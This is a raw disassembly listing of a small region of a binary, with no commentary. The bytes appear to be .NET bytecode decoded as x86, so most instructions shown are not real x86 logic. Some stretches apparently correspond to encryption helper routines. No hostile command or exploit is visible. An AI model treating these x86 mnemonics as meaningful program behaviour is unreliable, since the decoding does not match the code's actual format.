  4025c7:	04 28                	add    $0x28,%al
  4025c9:	29 00                	sub    %eax,(%eax)
  4025cb:	00 0a                	add    %cl,(%edx)
  4025cd:	07                   	pop    %es
  4025ce:	7b 03                	jnp    0x4025d3
  4025d0:	00 00                	add    %al,(%eax)
  4025d2:	04 02                	add    $0x2,%al
  4025d4:	7b 0e                	jnp    0x4025e4
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	04 6f                	add    $0x6f,%al
  4025da:	2a 00                	sub    (%eax),%al
  4025dc:	00 0a                	add    %cl,(%edx)
  4025de:	3a f2                	cmp    %dl,%dh
  4025e0:	00 00                	add    %al,(%eax)
  4025e2:	00 02                	add    %al,(%edx)
  4025e4:	7b 07                	jnp    0x4025ed
  4025e6:	00 00                	add    %al,(%eax)
  4025e8:	04 02                	add    $0x2,%al
  4025ea:	7b 09                	jnp    0x4025f5
  4025ec:	00 00                	add    %al,(%eax)
  4025ee:	04 6f                	add    $0x6f,%al
  4025f0:	32 00                	xor    (%eax),%al
  4025f2:	00 06                	add    %al,(%esi)
  4025f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4025f5:	2b 00                	sub    (%eax),%eax
  4025f7:	00 0a                	add    %cl,(%edx)
  4025f9:	13 06                	adc    (%esi),%eax
  4025fb:	12 06                	adc    (%esi),%al
  4025fd:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402600:	00 0a                	add    %cl,(%edx)
  402602:	2d 41 02 17 25       	sub    $0x25170241,%eax
  402607:	0a 7d 05             	or     0x5(%ebp),%bh
  40260a:	00 00                	add    %al,(%eax)
  40260c:	04 02                	add    $0x2,%al
  40260e:	11 06                	adc    %eax,(%esi)
  402610:	7d 10                	jge    0x402622
  402612:	00 00                	add    %al,(%eax)
  402614:	04 02                	add    $0x2,%al
  402616:	7c 06                	jl     0x40261e
  402618:	00 00                	add    %al,(%eax)
  40261a:	04 12                	add    $0x12,%al
  40261c:	06                   	push   %es
  40261d:	02 28                	add    (%eax),%ch
  40261f:	04 00                	add    $0x0,%al
  402621:	00 2b                	add    %ch,(%ebx)
  402623:	dd 53 03             	fstl   0x3(%ebx)
  402626:	00 00                	add    %al,(%eax)
  402628:	02 7b 10             	add    0x10(%ebx),%bh
  40262b:	00 00                	add    %al,(%eax)
  40262d:	04 13                	add    $0x13,%al
  40262f:	06                   	push   %es
  402630:	02 7c 10 00          	add    0x0(%eax,%edx,1),%bh
  402634:	00 04 fe             	add    %al,(%esi,%edi,8)
  402637:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40263c:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  402642:	00 00                	add    %al,(%eax)
  402644:	04 12                	add    $0x12,%al
  402646:	06                   	push   %es
  402647:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  40264d:	02 7b 07             	add    0x7(%ebx),%bh
  402650:	00 00                	add    %al,(%eax)
  402652:	04 6f                	add    $0x6f,%al
  402654:	31 00                	xor    %eax,(%eax)
  402656:	00 06                	add    %al,(%esi)
  402658:	6f                   	outsl  %ds:(%esi),(%dx)
  402659:	23 00                	and    (%eax),%eax
  40265b:	00 0a                	add    %cl,(%edx)
  40265d:	13 04 12             	adc    (%edx,%edx,1),%eax
  402660:	04 28                	add    $0x28,%al
  402662:	24 00                	and    $0x0,%al
  402664:	00 0a                	add    %cl,(%edx)
  402666:	2d 41 02 18 25       	sub    $0x25180241,%eax
  40266b:	0a 7d 05             	or     0x5(%ebp),%bh
  40266e:	00 00                	add    %al,(%eax)
  402670:	04 02                	add    $0x2,%al
  402672:	11 04 7d 0f 00 00 04 	adc    %eax,0x400000f(,%edi,2)
  402679:	02 7c 06 00          	add    0x0(%esi,%eax,1),%bh
  40267d:	00 04 12             	add    %al,(%edx,%edx,1)
  402680:	04 02                	add    $0x2,%al
  402682:	28 03                	sub    %al,(%ebx)
  402684:	00 00                	add    %al,(%eax)
  402686:	2b dd                	sub    %ebp,%ebx
  402688:	ef                   	out    %eax,(%dx)
  402689:	02 00                	add    (%eax),%al
  40268b:	00 02                	add    %al,(%edx)
  40268d:	7b 0f                	jnp    0x40269e
  40268f:	00 00                	add    %al,(%eax)
  402691:	04 13                	add    $0x13,%al
  402693:	04 02                	add    $0x2,%al
  402695:	7c 0f                	jl     0x4026a6
  402697:	00 00                	add    %al,(%eax)
  402699:	04 fe                	add    $0xfe,%al
  40269b:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4026a0:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  4026a6:	00 00                	add    %al,(%eax)
  4026a8:	04 12                	add    $0x12,%al
  4026aa:	04 28                	add    $0x28,%al
  4026ac:	26 00 00             	add    %al,%es:(%eax)
  4026af:	0a 13                	or     (%ebx),%dl
  4026b1:	05 11 05 8e 69       	add    $0x698e0511,%eax
  4026b6:	28 2e                	sub    %ch,(%esi)
  4026b8:	00 00                	add    %al,(%eax)
  4026ba:	0a 07                	or     (%edi),%al
  4026bc:	7b 03                	jnp    0x4026c1
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	04 02                	add    $0x2,%al
  4026c2:	7b 0e                	jnp    0x4026d2
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	04 11                	add    $0x11,%al
  4026c8:	05 28 2f 00 00       	add    $0x2f28,%eax
  4026cd:	0a 6f 30             	or     0x30(%edi),%ch
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	0a 2b                	or     (%ebx),%ch
  4026d4:	6a 02                	push   $0x2
  4026d6:	7b 07                	jnp    0x4026df
  4026d8:	00 00                	add    %al,(%eax)
  4026da:	04 02                	add    $0x2,%al
  4026dc:	7b 0a                	jnp    0x4026e8
  4026de:	00 00                	add    %al,(%eax)
  4026e0:	04 6f                	add    $0x6f,%al
  4026e2:	32 00                	xor    (%eax),%al
  4026e4:	00 06                	add    %al,(%esi)
  4026e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e7:	2b 00                	sub    (%eax),%eax
  4026e9:	00 0a                	add    %cl,(%edx)
  4026eb:	13 06                	adc    (%esi),%eax
  4026ed:	12 06                	adc    (%esi),%al
  4026ef:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4026f2:	00 0a                	add    %cl,(%edx)
  4026f4:	2d 41 02 19 25       	sub    $0x25190241,%eax
  4026f9:	0a 7d 05             	or     0x5(%ebp),%bh
  4026fc:	00 00                	add    %al,(%eax)
  4026fe:	04 02                	add    $0x2,%al
  402700:	11 06                	adc    %eax,(%esi)
  402702:	7d 10                	jge    0x402714
  402704:	00 00                	add    %al,(%eax)
  402706:	04 02                	add    $0x2,%al
  402708:	7c 06                	jl     0x402710
  40270a:	00 00                	add    %al,(%eax)
  40270c:	04 12                	add    $0x12,%al
  40270e:	06                   	push   %es
  40270f:	02 28                	add    (%eax),%ch
  402711:	04 00                	add    $0x0,%al
  402713:	00 2b                	add    %ch,(%ebx)
  402715:	dd 61 02             	frstor 0x2(%ecx)
  402718:	00 00                	add    %al,(%eax)
  40271a:	02 7b 10             	add    0x10(%ebx),%bh
  40271d:	00 00                	add    %al,(%eax)
  40271f:	04 13                	add    $0x13,%al
  402721:	06                   	push   %es
  402722:	02 7c 10 00          	add    0x0(%eax,%edx,1),%bh
  402726:	00 04 fe             	add    %al,(%esi,%edi,8)
  402729:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40272e:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  402734:	00 00                	add    %al,(%eax)
  402736:	04 12                	add    $0x12,%al
  402738:	06                   	push   %es
  402739:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  40273f:	07                   	pop    %es
  402740:	7b 03                	jnp    0x402745
  402742:	00 00                	add    %al,(%eax)
  402744:	04 02                	add    $0x2,%al
  402746:	7b 0e                	jnp    0x402756
  402748:	00 00                	add    %al,(%eax)
  40274a:	04 6f                	add    $0x6f,%al
  40274c:	31 00                	xor    %eax,(%eax)
  40274e:	00 0a                	add    %cl,(%edx)
  402750:	07                   	pop    %es
  402751:	7b 04                	jnp    0x402757
  402753:	00 00                	add    %al,(%eax)
  402755:	04 6f                	add    $0x6f,%al
  402757:	32 00                	xor    (%eax),%al
  402759:	00 0a                	add    %cl,(%edx)
  40275b:	28 33                	sub    %dh,(%ebx)
  40275d:	00 00                	add    %al,(%eax)
  40275f:	0a 0d 09 6f 34 00    	or     0x346f09,%cl
  402765:	00 0a                	add    %cl,(%edx)
  402767:	72 25                	jb     0x40278e
  402769:	00 00                	add    %al,(%eax)
  40276b:	70 1f                	jo     0x40278c
  40276d:	14 6f                	adc    $0x6f,%al
  40276f:	35 00 00 0a 09       	xor    $0x90a0000,%eax
  402774:	17                   	pop    %ss
  402775:	8d 01                	lea    (%ecx),%eax
  402777:	00 00                	add    %al,(%eax)
  402779:	01 25 16 02 7b 07    	add    %esp,0x77b0216
  40277f:	00 00                	add    %al,(%eax)
  402781:	04 a2                	add    $0xa2,%al
  402783:	6f                   	outsl  %ds:(%esi),(%dx)
  402784:	36 00 00             	add    %al,%ss:(%eax)
  402787:	0a 74 04 00          	or     0x0(%esp,%eax,1),%dh
  40278b:	00 01                	add    %al,(%ecx)
  40278d:	6f                   	outsl  %ds:(%esi),(%dx)
  40278e:	37                   	aaa
  40278f:	00 00                	add    %al,(%eax)
  402791:	0a 13                	or     (%ebx),%dl
  402793:	07                   	pop    %es
  402794:	12 07                	adc    (%edi),%al
  402796:	28 38                	sub    %bh,(%eax)
  402798:	00 00                	add    %al,(%eax)
  40279a:	0a 2d 41 02 1a 25    	or     0x251a0241,%ch
  4027a0:	0a 7d 05             	or     0x5(%ebp),%bh
  4027a3:	00 00                	add    %al,(%eax)
  4027a5:	04 02                	add    $0x2,%al
  4027a7:	11 07                	adc    %eax,(%edi)
  4027a9:	7d 11                	jge    0x4027bc
  4027ab:	00 00                	add    %al,(%eax)
  4027ad:	04 02                	add    $0x2,%al
  4027af:	7c 06                	jl     0x4027b7
  4027b1:	00 00                	add    %al,(%eax)
  4027b3:	04 12                	add    $0x12,%al
  4027b5:	07                   	pop    %es
  4027b6:	02 28                	add    (%eax),%ch
  4027b8:	05 00 00 2b dd       	add    $0xdd2b0000,%eax
  4027bd:	ba 01 00 00 02       	mov    $0x2000001,%edx
  4027c2:	7b 11                	jnp    0x4027d5
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	04 13                	add    $0x13,%al
  4027c8:	07                   	pop    %es
  4027c9:	02 7c 11 00          	add    0x0(%ecx,%edx,1),%bh
  4027cd:	00 04 fe             	add    %al,(%esi,%edi,8)
  4027d0:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4027d5:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  4027db:	00 00                	add    %al,(%eax)
  4027dd:	04 12                	add    $0x12,%al
  4027df:	07                   	pop    %es
  4027e0:	28 39                	sub    %bh,(%ecx)
  4027e2:	00 00                	add    %al,(%eax)
  4027e4:	0a 02                	or     (%edx),%al
  4027e6:	14 7d                	adc    $0x7d,%al
  4027e8:	0e                   	push   %cs
  4027e9:	00 00                	add    %al,(%eax)
  4027eb:	04 de                	add    $0xde,%al
  4027ed:	13 13                	adc    (%ebx),%edx
  4027ef:	08 02                	or     %al,(%edx)
  4027f1:	11 08                	adc    %ecx,(%eax)
  4027f3:	7d 0c                	jge    0x402801
  4027f5:	00 00                	add    %al,(%eax)
  4027f7:	04 02                	add    $0x2,%al
  4027f9:	17                   	pop    %ss
  4027fa:	7d 0d                	jge    0x402809
  4027fc:	00 00                	add    %al,(%eax)
  4027fe:	04 de                	add    $0xde,%al
  402800:	00 02                	add    %al,(%edx)
  402802:	7b 0d                	jnp    0x402811
  402804:	00 00                	add    %al,(%eax)
  402806:	04 13                	add    $0x13,%al
  402808:	09 11                	or     %edx,(%ecx)
  40280a:	09 17                	or     %edx,(%edi)
  40280c:	40                   	inc    %eax
  40280d:	0b 01                	or     (%ecx),%eax
  40280f:	00 00                	add    %al,(%eax)
  402811:	02 02                	add    (%edx),%al
  402813:	7b 0c                	jnp    0x402821
  402815:	00 00                	add    %al,(%eax)
  402817:	04 74                	add    $0x74,%al
  402819:	0b 00                	or     (%eax),%eax
  40281b:	00 01                	add    %al,(%ecx)
  40281d:	7d 12                	jge    0x402831
  40281f:	00 00                	add    %al,(%eax)
  402821:	04 02                	add    $0x2,%al
  402823:	7b 07                	jnp    0x40282c
  402825:	00 00                	add    %al,(%eax)
  402827:	04 02                	add    $0x2,%al
  402829:	7b 0b                	jnp    0x402836
  40282b:	00 00                	add    %al,(%eax)
  40282d:	04 6f                	add    $0x6f,%al
  40282f:	32 00                	xor    (%eax),%al
  402831:	00 06                	add    %al,(%esi)
  402833:	6f                   	outsl  %ds:(%esi),(%dx)
  402834:	2b 00                	sub    (%eax),%eax
  402836:	00 0a                	add    %cl,(%edx)
  402838:	13 06                	adc    (%esi),%eax
  40283a:	12 06                	adc    (%esi),%al
  40283c:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40283f:	00 0a                	add    %cl,(%edx)
  402841:	2d 41 02 1b 25       	sub    $0x251b0241,%eax
  402846:	0a 7d 05             	or     0x5(%ebp),%bh
  402849:	00 00                	add    %al,(%eax)
  40284b:	04 02                	add    $0x2,%al
  40284d:	11 06                	adc    %eax,(%esi)
  40284f:	7d 10                	jge    0x402861
  402851:	00 00                	add    %al,(%eax)
  402853:	04 02                	add    $0x2,%al
  402855:	7c 06                	jl     0x40285d
  402857:	00 00                	add    %al,(%eax)
  402859:	04 12                	add    $0x12,%al
  40285b:	06                   	push   %es
  40285c:	02 28                	add    (%eax),%ch
  40285e:	04 00                	add    $0x0,%al
  402860:	00 2b                	add    %ch,(%ebx)
  402862:	dd 14 01             	fstl   (%ecx,%eax,1)
  402865:	00 00                	add    %al,(%eax)
  402867:	02 7b 10             	add    0x10(%ebx),%bh
  40286a:	00 00                	add    %al,(%eax)
  40286c:	04 13                	add    $0x13,%al
  40286e:	06                   	push   %es
  40286f:	02 7c 10 00          	add    0x0(%eax,%edx,1),%bh
  402873:	00 04 fe             	add    %al,(%esi,%edi,8)
  402876:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40287b:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  402881:	00 00                	add    %al,(%eax)
  402883:	04 12                	add    $0x12,%al
  402885:	06                   	push   %es
  402886:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  40288c:	02 7b 07             	add    0x7(%ebx),%bh
  40288f:	00 00                	add    %al,(%eax)
  402891:	04 28                	add    $0x28,%al
  402893:	27                   	daa
  402894:	00 00                	add    %al,(%eax)
  402896:	0a 02                	or     (%edx),%al
  402898:	7b 12                	jnp    0x4028ac
  40289a:	00 00                	add    %al,(%eax)
  40289c:	04 6f                	add    $0x6f,%al
  40289e:	3a 00                	cmp    (%eax),%al
  4028a0:	00 0a                	add    %cl,(%edx)
  4028a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4028a3:	3b 00                	cmp    (%eax),%eax
  4028a5:	00 0a                	add    %cl,(%edx)
  4028a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4028a8:	32 00                	xor    (%eax),%al
  4028aa:	00 06                	add    %al,(%esi)
  4028ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ad:	2b 00                	sub    (%eax),%eax
  4028af:	00 0a                	add    %cl,(%edx)
  4028b1:	13 06                	adc    (%esi),%eax
  4028b3:	12 06                	adc    (%esi),%al
  4028b5:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4028b8:	00 0a                	add    %cl,(%edx)
  4028ba:	2d 41 02 1c 25       	sub    $0x251c0241,%eax
  4028bf:	0a 7d 05             	or     0x5(%ebp),%bh
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	04 02                	add    $0x2,%al
  4028c6:	11 06                	adc    %eax,(%esi)
  4028c8:	7d 10                	jge    0x4028da
  4028ca:	00 00                	add    %al,(%eax)
  4028cc:	04 02                	add    $0x2,%al
  4028ce:	7c 06                	jl     0x4028d6
  4028d0:	00 00                	add    %al,(%eax)
  4028d2:	04 12                	add    $0x12,%al
  4028d4:	06                   	push   %es
  4028d5:	02 28                	add    (%eax),%ch
  4028d7:	04 00                	add    $0x0,%al
  4028d9:	00 2b                	add    %ch,(%ebx)
  4028db:	dd 9b 00 00 00 02    	fstpl  0x2000000(%ebx)
  4028e1:	7b 10                	jnp    0x4028f3
  4028e3:	00 00                	add    %al,(%eax)
  4028e5:	04 13                	add    $0x13,%al
  4028e7:	06                   	push   %es
  4028e8:	02 7c 10 00          	add    0x0(%eax,%edx,1),%bh
  4028ec:	00 04 fe             	add    %al,(%esi,%edi,8)
  4028ef:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4028f4:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  4028fa:	00 00                	add    %al,(%eax)
  4028fc:	04 12                	add    $0x12,%al
  4028fe:	06                   	push   %es
  4028ff:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  402905:	02 7b 12             	add    0x12(%ebx),%bh
  402908:	00 00                	add    %al,(%eax)
  40290a:	04 6f                	add    $0x6f,%al
  40290c:	3c 00                	cmp    $0x0,%al
  40290e:	00 0a                	add    %cl,(%edx)
  402910:	28 29                	sub    %ch,(%ecx)
  402912:	00 00                	add    %al,(%eax)
  402914:	0a 02                	or     (%edx),%al
  402916:	14 7d                	adc    $0x7d,%al
  402918:	12 00                	adc    (%eax),%al
  40291a:	00 04 02             	add    %al,(%edx,%eax,1)
  40291d:	14 7d                	adc    $0x7d,%al
  40291f:	0c 00                	or     $0x0,%al
  402921:	00 04 de             	add    %al,(%esi,%ebx,8)
  402924:	2e 13 0a             	adc    %cs:(%edx),%ecx
  402927:	02 1f                	add    (%edi),%bl
  402929:	fe                   	(bad)
  40292a:	7d 05                	jge    0x402931
  40292c:	00 00                	add    %al,(%eax)
  40292e:	04 02                	add    $0x2,%al
  402930:	14 7d                	adc    $0x7d,%al
  402932:	09 00                	or     %eax,(%eax)
  402934:	00 04 02             	add    %al,(%edx,%eax,1)
  402937:	14 7d                	adc    $0x7d,%al
  402939:	0a 00                	or     (%eax),%al
  40293b:	00 04 02             	add    %al,(%edx,%eax,1)
  40293e:	14 7d                	adc    $0x7d,%al
  402940:	0b 00                	or     (%eax),%eax
  402942:	00 04 02             	add    %al,(%edx,%eax,1)
  402945:	7c 06                	jl     0x40294d
  402947:	00 00                	add    %al,(%eax)
  402949:	04 11                	add    $0x11,%al
  40294b:	0a 28                	or     (%eax),%ch
  40294d:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  402952:	28 02                	sub    %al,(%edx)
  402954:	1f                   	pop    %ds
  402955:	fe                   	(bad)
  402956:	7d 05                	jge    0x40295d
  402958:	00 00                	add    %al,(%eax)
  40295a:	04 02                	add    $0x2,%al
  40295c:	14 7d                	adc    $0x7d,%al
  40295e:	09 00                	or     %eax,(%eax)
  402960:	00 04 02             	add    %al,(%edx,%eax,1)
  402963:	14 7d                	adc    $0x7d,%al
  402965:	0a 00                	or     (%eax),%al
  402967:	00 04 02             	add    %al,(%edx,%eax,1)
  40296a:	14 7d                	adc    $0x7d,%al
  40296c:	0b 00                	or     (%eax),%eax
  40296e:	00 04 02             	add    %al,(%edx,%eax,1)
  402971:	7c 06                	jl     0x402979
  402973:	00 00                	add    %al,(%eax)
  402975:	04 28                	add    $0x28,%al
  402977:	3e 00 00             	add    %al,%ds:(%eax)
  40297a:	0a 2a                	or     (%edx),%ch
  40297c:	41                   	inc    %ecx
  40297d:	34 00                	xor    $0x0,%al
  40297f:	00 00                	add    %al,(%eax)
  402981:	00 00                	add    %al,(%eax)
  402983:	00 6f 00             	add    %ch,0x0(%edi)
  402986:	00 00                	add    %al,(%eax)
  402988:	bb 02 00 00 2a       	mov    $0x2a000002,%ebx
  40298d:	03 00                	add    (%eax),%eax
  40298f:	00 13                	add    %dl,(%ebx)
  402991:	00 00                	add    %al,(%eax)
  402993:	00 0b                	add    %cl,(%ebx)
  402995:	00 00                	add    %al,(%eax)
  402997:	01 00                	add    %eax,(%eax)
  402999:	00 00                	add    %al,(%eax)
  40299b:	00 0e                	add    %cl,(%esi)
  40299d:	00 00                	add    %al,(%eax)
  40299f:	00 53 04             	add    %dl,0x4(%ebx)
  4029a2:	00 00                	add    %al,(%eax)
  4029a4:	61                   	popa
  4029a5:	04 00                	add    $0x0,%al
  4029a7:	00 2e                	add    %ch,(%esi)
  4029a9:	00 00                	add    %al,(%eax)
  4029ab:	00 0b                	add    %cl,(%ebx)
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	01 1b                	add    %ebx,(%ebx)
  4029b1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4029b4:	8a 00                	mov    (%eax),%al
  4029b6:	00 00                	add    %al,(%eax)
  4029b8:	05 00 00 11 1f       	add    $0x1f110000,%eax
  4029bd:	10 8d 2e 00 00 01    	adc    %cl,0x100002e(%ebp)
  4029c3:	0b 28                	or     (%eax),%ebp
  4029c5:	40                   	inc    %eax
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4029cb:	03 6f 41             	add    0x41(%edi),%ebp
  4029ce:	00 00                	add    %al,(%eax)
  4029d0:	0a 08                	or     (%eax),%cl
  4029d2:	07                   	pop    %es
  4029d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d4:	42                   	inc    %edx
  4029d5:	00 00                	add    %al,(%eax)
  4029d7:	0a 08                	or     (%eax),%cl
  4029d9:	08 6f 43             	or     %ch,0x43(%edi)
  4029dc:	00 00                	add    %al,(%eax)
  4029de:	0a 08                	or     (%eax),%cl
  4029e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e1:	44                   	inc    %esp
  4029e2:	00 00                	add    %al,(%eax)
  4029e4:	0a 6f 45             	or     0x45(%edi),%ch
  4029e7:	00 00                	add    %al,(%eax)
  4029e9:	0a 0d 73 46 00 00    	or     0x4673,%cl
  4029ef:	0a 13                	or     (%ebx),%dl
  4029f1:	04 11                	add    $0x11,%al
  4029f3:	04 09                	add    $0x9,%al
  4029f5:	17                   	pop    %ss
  4029f6:	73 47                	jae    0x402a3f
  4029f8:	00 00                	add    %al,(%eax)
  4029fa:	0a 13                	or     (%ebx),%dl
  4029fc:	05 11 05 02 16       	add    $0x16020511,%eax
  402a01:	02 8e 69 6f 48 00    	add    0x486f69(%esi),%cl
  402a07:	00 0a                	add    %cl,(%edx)
  402a09:	11 05 6f 49 00 00    	adc    %eax,0x496f
  402a0f:	0a 11                	or     (%ecx),%dl
  402a11:	04 6f                	add    $0x6f,%al
  402a13:	4a                   	dec    %edx
  402a14:	00 00                	add    %al,(%eax)
  402a16:	0a 0a                	or     (%edx),%cl
  402a18:	de 18                	ficomps (%eax)
  402a1a:	11 05 2c 07 11 05    	adc    %eax,0x511072c
  402a20:	6f                   	outsl  %ds:(%esi),(%dx)
  402a21:	4b                   	dec    %ebx
  402a22:	00 00                	add    %al,(%eax)
  402a24:	0a dc                	or     %ah,%bl
  402a26:	11 04 2c             	adc    %eax,(%esp,%ebp,1)
  402a29:	07                   	pop    %es
  402a2a:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402a2d:	4b                   	dec    %ebx
  402a2e:	00 00                	add    %al,(%eax)
  402a30:	0a dc                	or     %ah,%bl
  402a32:	09 6f 4b             	or     %ebp,0x4b(%edi)
  402a35:	00 00                	add    %al,(%eax)
  402a37:	0a de                	or     %dh,%bl
  402a39:	0a 08                	or     (%eax),%cl
  402a3b:	2c 06                	sub    $0x6,%al
  402a3d:	08 6f 4b             	or     %ch,0x4b(%edi)
  402a40:	00 00                	add    %al,(%eax)
  402a42:	0a dc                	or     %ah,%bl
  402a44:	06                   	push   %es
  402a45:	2a 00                	sub    (%eax),%al
  402a47:	00 01                	add    %al,(%ecx)
  402a49:	28 00                	sub    %al,(%eax)
  402a4b:	00 02                	add    %al,(%edx)
  402a4d:	00 41 00             	add    %al,0x0(%ecx)
  402a50:	1d 5e 00 0c 00       	sbb    $0xc005e,%eax
  402a55:	00 00                	add    %al,(%eax)
  402a57:	00 02                	add    %al,(%edx)
  402a59:	00 36                	add    %dh,(%esi)
  402a5b:	00 34 6a             	add    %dh,(%edx,%ebp,2)
  402a5e:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a61:	00 00                	add    %al,(%eax)
  402a63:	00 02                	add    %al,(%edx)
  402a65:	00 0e                	add    %cl,(%esi)
  402a67:	00 70 7e             	add    %dh,0x7e(%eax)
  402a6a:	00 0a                	add    %cl,(%edx)
  402a6c:	00 00                	add    %al,(%eax)
  402a6e:	00 00                	add    %al,(%eax)
  402a70:	1b 30                	sbb    (%eax),%esi
  402a72:	04 00                	add    $0x0,%al
  402a74:	8a 00                	mov    (%eax),%al
  402a76:	00 00                	add    %al,(%eax)
  402a78:	05 00 00 11 1f       	add    $0x1f110000,%eax
  402a7d:	10 8d 2e 00 00 01    	adc    %cl,0x100002e(%ebp)
  402a83:	0a 28                	or     (%eax),%ch
  402a85:	40                   	inc    %eax
  402a86:	00 00                	add    %al,(%eax)
  402a88:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402a8b:	03 6f 41             	add    0x41(%edi),%ebp
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	0a 08                	or     (%eax),%cl
  402a92:	06                   	push   %es
  402a93:	6f                   	outsl  %ds:(%esi),(%dx)
  402a94:	42                   	inc    %edx
  402a95:	00 00                	add    %al,(%eax)
  402a97:	0a 08                	or     (%eax),%cl
  402a99:	08 6f 43             	or     %ch,0x43(%edi)
  402a9c:	00 00                	add    %al,(%eax)
  402a9e:	0a 08                	or     (%eax),%cl
  402aa0:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa1:	44                   	inc    %esp
  402aa2:	00 00                	add    %al,(%eax)
  402aa4:	0a 6f 4c             	or     0x4c(%edi),%ch
  402aa7:	00 00                	add    %al,(%eax)
  402aa9:	0a 0d 73 46 00 00    	or     0x4673,%cl
  402aaf:	0a 13                	or     (%ebx),%dl
  402ab1:	04 11                	add    $0x11,%al
  402ab3:	04 09                	add    $0x9,%al
  402ab5:	17                   	pop    %ss
  402ab6:	73 47                	jae    0x402aff
  402ab8:	00 00                	add    %al,(%eax)
  402aba:	0a 13                	or     (%ebx),%dl
  402abc:	05 11 05 02 16       	add    $0x16020511,%eax
  402ac1:	02 8e 69 6f 48 00    	add    0x486f69(%esi),%cl
  402ac7:	00 0a                	add    %cl,(%edx)
  402ac9:	11 05 6f 49 00 00    	adc    %eax,0x496f
  402acf:	0a 11                	or     (%ecx),%dl
  402ad1:	04 6f                	add    $0x6f,%al
  402ad3:	4a                   	dec    %edx
  402ad4:	00 00                	add    %al,(%eax)
  402ad6:	0a 0b                	or     (%ebx),%cl
  402ad8:	de 18                	ficomps (%eax)
  402ada:	11 05 2c 07 11 05    	adc    %eax,0x511072c
  402ae0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ae1:	4b                   	dec    %ebx
  402ae2:	00 00                	add    %al,(%eax)
  402ae4:	0a dc                	or     %ah,%bl
  402ae6:	11 04 2c             	adc    %eax,(%esp,%ebp,1)
  402ae9:	07                   	pop    %es
  402aea:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402aed:	4b                   	dec    %ebx
  402aee:	00 00                	add    %al,(%eax)
  402af0:	0a dc                	or     %ah,%bl
  402af2:	09 6f 4b             	or     %ebp,0x4b(%edi)
  402af5:	00 00                	add    %al,(%eax)
  402af7:	0a de                	or     %dh,%bl
  402af9:	0a 08                	or     (%eax),%cl
  402afb:	2c 06                	sub    $0x6,%al
  402afd:	08 6f 4b             	or     %ch,0x4b(%edi)
  402b00:	00 00                	add    %al,(%eax)
  402b02:	0a dc                	or     %ah,%bl
  402b04:	07                   	pop    %es
  402b05:	2a 00                	sub    (%eax),%al
  402b07:	00 01                	add    %al,(%ecx)
  402b09:	28 00                	sub    %al,(%eax)
  402b0b:	00 02                	add    %al,(%edx)
  402b0d:	00 41 00             	add    %al,0x0(%ecx)
  402b10:	1d 5e 00 0c 00       	sbb    $0xc005e,%eax
  402b15:	00 00                	add    %al,(%eax)
  402b17:	00 02                	add    %al,(%edx)
  402b19:	00 36                	add    %dh,(%esi)
  402b1b:	00 34 6a             	add    %dh,(%edx,%ebp,2)
  402b1e:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402b21:	00 00                	add    %al,(%eax)
  402b23:	00 02                	add    %al,(%edx)
  402b25:	00 0e                	add    %cl,(%esi)
  402b27:	00 70 7e             	add    %dh,0x7e(%eax)
  402b2a:	00 0a                	add    %cl,(%edx)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	00 00                	add    %al,(%eax)
  402b30:	13 30                	adc    (%eax),%esi
  402b32:	02 00                	add    (%eax),%al
  402b34:	3f                   	aas
  402b35:	00 00                	add    %al,(%eax)
  402b37:	00 06                	add    %al,(%esi)
  402b39:	00 00                	add    %al,(%eax)
  402b3b:	11 12                	adc    %edx,(%edx)
  402b3d:	00 28                	add    %ch,(%eax)
  402b3f:	1b 00                	sbb    (%eax),%eax
  402b41:	00 0a                	add    %cl,(%edx)
  402b43:	7d 16                	jge    0x402b5b
  402b45:	00 00                	add    %al,(%eax)
  402b47:	04 12                	add    $0x12,%al
  402b49:	00 02                	add    %al,(%edx)
  402b4b:	7d 18                	jge    0x402b65
  402b4d:	00 00                	add    %al,(%eax)
  402b4f:	04 12                	add    $0x12,%al
  402b51:	00 03                	add    %al,(%ebx)
  402b53:	7d 17                	jge    0x402b6c
  402b55:	00 00                	add    %al,(%eax)
  402b57:	04 12                	add    $0x12,%al
  402b59:	00 15 7d 15 00 00    	add    %dl,0x157d
  402b5f:	04 12                	add    $0x12,%al
